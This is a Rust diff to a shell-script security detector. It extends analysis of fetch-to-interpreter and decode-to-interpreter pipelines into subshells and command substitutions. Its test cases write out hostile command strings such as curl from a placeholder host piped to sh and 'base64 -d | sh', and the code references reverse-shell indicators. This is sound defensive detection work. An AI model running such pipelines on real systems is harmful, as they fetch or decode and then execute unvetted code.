@@ -7,16 +7,17 @@
 use super::budget::{CachedFindingSummary, ShellBudget};
 use super::command::{segment_commands, skip_command_prefixes, statement_outcomes};
 use super::effects::{
-    EgressEffect, StdoutEffect, body_live_fetch_stdout, command_decodes, command_fetches,
-    ir_command_decodes, ir_command_effects, ir_node_reaches_interpreter, ir_node_stdout_preserved,
+    StdoutEffect, body_live_fetch_stdout, command_decodes, command_fetches, ir_command_decodes,
+    ir_command_effects, ir_node_reaches_interpreter, ir_node_stdout_preserved,
     pipeline_has_live_producer, segment_has_live_producer, segment_stdin_reaches_interpreter,
     stdout_reaches,
 };
+use super::egress::node_has_live_fetch_stdout;
 use super::indicators::{
     chmod_relaxes_shared_temp, reverse_shell_spelling, segment_has_shared_temp_path,
 };
 use super::interpreter::{INTERPRETER_BASENAMES, static_command_body};
-use super::ir::{CommandNode, LogicalUnit};
+use super::ir::{CommandNode, ExecutedBody, LogicalUnit, ShellProgram};
 use super::lexer::{ShellToken, SubstKind, tokenize};
 use super::syntax::{
     GroupKind, Outcomes, conditional_statements, grouped_token_ranges, pipeline_segments,
@@ -42,9 +43,9 @@ pub(in crate::detect) fn shell_consumption_findings(
     if !budget.spend(tokens.len()) {
         return;
     }
-    // The typed path owns direct command and compound reachability. The token
-    // walk below remains for substitutions, static bodies, and unsupported
-    // nested text that has not yet become child IR.
+    // The typed path owns direct command, compound, and available child
+    // reachability. The token walk below remains as a bounded compatibility
+    // fallback for unsupported or depth-capped nested text.
     if shell_unit.is_some_and(|unit| typed_fetch_reaches_interpreter(unit, budget)) {
         push_finding(
             found,
@@ -66,6 +67,13 @@ pub(in crate::detect) fn shell_consumption_findings(
                 Confidence::LexicalFallback,
             ),
         );
+    }
+    if let Some(unit) = shell_unit {
+        let child_findings =
+            typed_child_consumption_findings(&unit.statements, number, download_rule, budget);
+        for finding in child_findings {
+            push_finding(found, finding);
+        }
     }
     let mut outcomes = Outcomes::ANY;
     for (statement, guard) in conditional_statements(tokens) {
@@ -267,10 +275,127 @@ pub(in crate::detect) fn shell_consumption_findings(
     }
 }
 
-/// Direct fetch-to-interpreter pairing over the typed shell IR. Only direct
-/// command nodes are claimed here; compound producers and re-parsed bodies
-/// stay on the bounded token fallback until their child programs are stored
-/// in the IR.
+/// Walk child programs already owned by the IR. This keeps static bodies and
+/// command/process substitutions on the same typed path as their parent;
+/// the raw body walk remains only as a fallback when the depth ceiling made
+/// a child program unavailable.
+fn typed_child_consumption_findings(
+    statements: &[super::ir::Statement],
+    number: u32,
+    download_rule: &'static str,
+    budget: &mut ShellBudget,
+) -> Vec<ResultParts> {
+    let mut found = Vec::new();
+    for statement in statements.iter().filter(|statement| statement.reachable) {
+        for pipeline in &statement.pipelines {
+            for node in &pipeline.commands {
+                typed_node_child_findings(node, number, download_rule, budget, &mut found);
+            }
+        }
+    }
+    found
+}
+
+fn typed_node_child_findings(
+    node: &CommandNode,
+    number: u32,
+    download_rule: &'static str,
+    budget: &mut ShellBudget,
+    found: &mut Vec<ResultParts>,
+) {
+    match node {
+        CommandNode::Simple(command) => {
+            if let Some(body) = &command.body {
+                append_child_program_findings(body, number, download_rule, budget, found);
+            }
+            for word in &command.args {
+                for substitution in &word.substitutions {
+                    if matches!(substitution.kind, SubstKind::Command | SubstKind::Process) {
+                        let body = ExecutedBody {
+                            source: substitution.source.clone(),
+                            program: substitution.program.clone(),
+                        };
+                        append_child_program_findings(&body, number, download_rule, budget, found);
+                    }
+                }
+            }
+        }
+        CommandNode::Subshell { body, .. } | CommandNode::BraceGroup { body, .. } => {
+            found.extend(typed_child_consumption_findings(
+                body,
+                number,
+                download_rule,
+                budget,
+            ));
+        }
+        CommandNode::Arithmetic { .. }
+        | CommandNode::ControlFlow { .. }
+        | CommandNode::Opaque { .. } => {}
+    }
+}
+
+fn append_child_program_findings(
+    body: &ExecutedBody,
+    number: u32,
+    download_rule: &'static str,
+    budget: &mut ShellBudget,
+    found: &mut Vec<ResultParts>,
+) {
+    let Some(program) = body.program.as_deref() else {
+        found.extend(cached_body_consumption_findings(
+            &body.source,
+            number,
+            download_rule,
+            budget,
+        ));
+        return;
+    };
+    found.extend(cached_program_consumption_findings(
+        &body.source,
+        program,
+        number,
+        download_rule,
+        budget,
+    ));
+}
+
+fn cached_program_consumption_findings(
+    source: &str,
+    program: &ShellProgram,
+    number: u32,
+    download_rule: &'static str,
+    budget: &mut ShellBudget,
+) -> Vec<ResultParts> {
+    if budget.exhausted() {
+        return Vec::new();
+    }
+    if let Some(summary) = budget.cached_finding_summary(source) {
+        return finding_parts(summary, number, download_rule);
+    }
+    if !budget.enter() {
+        return Vec::new();
+    }
+    let mut found = Vec::new();
+    for unit in program.units() {
+        shell_consumption_findings(
+            unit.tokens(),
+            Some(unit),
+            number,
+            download_rule,
+            &mut found,
+            budget,
+        );
+    }
+    budget.leave();
+    if !budget.exhausted() {
+        budget.cache_finding_summary(source, summarize_findings(&found));
+    }
+    found
+}
+
+/// Direct fetch-to-interpreter pairing over the typed shell IR, including
+/// live output from a static child body. Depth-capped children stay on the
+/// bounded token fallback.
 fn typed_fetch_reaches_interpreter(unit: &LogicalUnit, budget: &mut ShellBudget) -> bool {
     unit.statements
         .iter()
@@ -316,18 +441,49 @@ fn typed_pipeline_reaches_interpreter(
 }
 
 fn typed_node_has_live_fetch(node: &CommandNode, budget: &mut ShellBudget) -> bool {
-    let CommandNode::Simple(command) = node else {
+    if !node_has_live_fetch_stdout(node, budget) {
         return false;
-    };
-    let effects = ir_command_effects(command, budget);
-    effects.egress == EgressEffect::NetworkFetch && effects.stdout != StdoutEffect::Redirected
+    }
+    true
 }
 
 fn typed_node_has_live_decoder(node: &CommandNode, budget: &mut ShellBudget) -> bool {
-    let CommandNode::Simple(command) = node else {
+    match node {
+        CommandNode::Simple(command) => {
+            (ir_command_decodes(command)
+                && ir_command_effects(command, budget).stdout != StdoutEffect::Redirected)
+                || command
+                    .body
+                    .as_ref()
+                    .and_then(|body| body.program.as_deref())
+                    .is_some_and(|program| typed_program_has_live_decoder(program, budget))
+        }
+        CommandNode::Subshell { .. } | CommandNode::BraceGroup { .. } => false,
+        CommandNode::Arithmetic { .. }
+        | CommandNode::ControlFlow { .. }
+        | CommandNode::Opaque { .. } => false,
+    }
+}
+
+fn typed_program_has_live_decoder(program: &ShellProgram, budget: &mut ShellBudget) -> bool {
+    if !budget.spend(1) {
         return false;
-    };
-    ir_command_decodes(command) && ir_node_stdout_preserved(node, budget)
+    }
+    program.units().iter().any(|unit| {
+        unit.statements
+            .iter()
+            .filter(|statement| statement.reachable)
+            .any(|statement| {
+                statement.pipelines.iter().any(|pipeline| {
+                    (0..pipeline.commands.len()).any(|producer| {
+                        typed_node_has_live_decoder(&pipeline.commands[producer], budget)
+                            && pipeline.commands[producer + 1..]
+                                .iter()
+                                .all(|node| ir_node_stdout_preserved(node, budget))
+                    })
+                })
+            })
+    })
 }
 
 /// Walk a static shell body once per analysis and cache its complete finding
@@ -639,6 +795,8 @@ mod tests {
                 false,
             ),
             ("curl https://example.test/live >body | sh", false),
+            ("sh -c 'curl https://example.test/live' | sh", true),
+            ("sh -c 'curl https://example.test/live | sh' | sh", false),
         ];
 
         for (source, expected) in cases {
@@ -664,6 +822,8 @@ mod tests {
             ("false && base64 -d | sh", false),
             ("base64 -d | (echo safe; sh)", true),
             ("base64 -d | (false && sh)", false),
+            ("sh -c 'base64 -d' | sh", true),
+            ("sh -c 'base64 -d | sh' | sh", false),
         ];
 
         for (source, expected) in cases {
